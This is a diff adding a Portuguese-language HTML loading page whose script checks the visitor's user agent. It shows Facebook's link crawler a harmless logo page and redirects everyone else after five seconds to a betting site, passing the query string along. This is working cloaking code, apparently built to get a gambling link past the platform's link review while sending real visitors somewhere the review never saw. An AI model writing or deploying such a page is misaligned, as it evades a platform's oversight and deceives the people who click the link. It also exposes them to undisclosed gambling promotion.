@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta property="og:title" content="Minha Página Final">
+    <meta property="og:description" content="Esta é a página de carregamento final para o Facebook Crawler.">
+    <meta property="og:image" content="/mnt/data/44.avif"> <!-- Caminho para a imagem do logo -->
+   
+    <title></title>
+<style>
+    /* Zera margens e paddings padrão de todos os elementos */
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box; /* Garante que padding e bordas sejam incluídos no cálculo da largura/altura */
+    }
+
+    /* Garante que o <html> e <body> ocupem 100% da altura da janela */
+    html, body {
+        height: 100%;
+    }
+
+    /* Estilo da tela de carregamento */
+    .loading-screen {
+        display: flex; /* Usa Flexbox para centralizar conteúdo */
+        flex-direction: column; /* Alinha itens verticalmente */
+        justify-content: center; /* Centraliza verticalmente */
+        align-items: center; /* Centraliza horizontalmente */
+        height: 100vh; /* Ocupa toda a altura da janela */
+        background-color: #228D68; /* Cor de fundo azul */
+        color: white; /* Cor do texto */
+        font-size: 24px; /* Tamanho do texto */
+        font-weight: bold; /* Texto em negrito */
+        text-align: center; /* Centraliza o texto */
+        padding: 20px; /* Espaçamento interno */
+    }
+
+    /* Estilo do logo */
+    .loading-logo {
+        max-width: 200px; /* Largura máxima da imagem */
+        width: 100%; /* Escala conforme o contêiner */
+        margin-bottom: 20px; /* Espaço abaixo da imagem */
+    }
+
+    /* Estilos para dispositivos com largura menor que 600px */
+    @media (max-width: 600px) {
+        .loading-screen {
+            font-size: 20px; /* Reduz o tamanho da fonte */
+        }
+
+        .loading-logo {
+            max-width: 150px; /* Reduz o tamanho da imagem */
+        }
+    }
+</style>
+
+</head>
+<body>
+    <div class="loading-screen">
+        <img src="./mnt/data/44.avif" alt="Logo" class="loading-logo">
+    </div>
+
+    <script>
+        // Função para detectar o Facebook Crawler e bloquear o redirecionamento
+        if (!navigator.userAgent.includes("facebookexternalhit")) {
+            
+            const LINK_BET = "https://ok44u.com/"; // Link para o qual será redirecionado
+
+            // Redirecionar após 5 segundos se não for o Facebook Crawler
+            setTimeout(function() {
+                window.location.href = `${LINK_BET}${LINK_BET.endsWith('/') ? '' : '/'}${window.location?.search || ''}`; // Substitua pelo link desejado
+            }, 5000); // 5000 milissegundos = 5 segundos
+        }
+    </script>
+</body>
+</html>
